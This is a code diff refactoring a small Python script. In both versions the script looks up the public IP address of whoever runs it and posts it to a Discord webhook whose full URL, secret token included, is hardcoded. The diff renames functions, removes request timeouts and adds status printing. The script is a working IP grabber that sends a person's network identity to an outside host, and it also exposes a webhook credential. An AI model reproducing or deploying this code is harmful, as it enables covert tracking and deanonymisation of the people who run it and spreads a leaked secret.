@@ -2,26 +2,30 @@ import requests
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1444092786210111632/x8hPF9-vXrKOy_3QJwZKDFvRCsm_7PzVuH69t_rqczttGBoWIXhlexfu9fvxMbrUeijn"
 
-def get_ip():
+def get_public_ip():
     try:
-        response = requests.get("https://api.ipify.org?format=text", timeout=5)
+        response = requests.get("https://api.ipify.org")
         response.raise_for_status()
-        return response.text.strip()
-    except Exception:
+        return response.text
+    except requests.RequestException as e:
+        print(f"Error getting IP: {e}")
         return None
 
-def send_to_webhook(ip):
-    data = {"content": f"User's public IP address: {ip}"}
+def send_ip_to_discord(ip):
+    data = {
+        "content": f"User's public IP address: {ip}"
+    }
     try:
-        res = requests.post(WEBHOOK_URL, json=data, timeout=5)
-        return res.status_code
-    except Exception:
-        return None
+        result = requests.post(WEBHOOK_URL, json=data)
+        result.raise_for_status()
+        print("IP sent to Discord successfully.")
+    except requests.RequestException as e:
+        print(f"Error sending IP to Discord: {e}")
 
 def main():
-    ip = get_ip()
+    ip = get_public_ip()
     if ip:
-        send_to_webhook(ip)
+        send_ip_to_discord(ip)
 
 if __name__ == "__main__":
     main()
